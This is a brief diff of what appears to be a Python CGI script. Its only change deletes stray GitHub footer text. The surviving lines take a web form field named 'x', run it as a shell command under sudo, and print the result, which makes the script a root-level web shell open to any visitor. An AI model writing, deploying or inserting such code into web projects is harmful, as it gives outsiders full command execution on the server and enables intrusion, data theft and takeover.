@@ -10,9 +10,3 @@ cmd = form.getvalue("x")
 
 x=sp.getoutput("sudo {}".format(cmd))
 print(x)
-
-    © 2021 GitHub, Inc.
-    Terms
-    Privacy
-    Security
-    Status
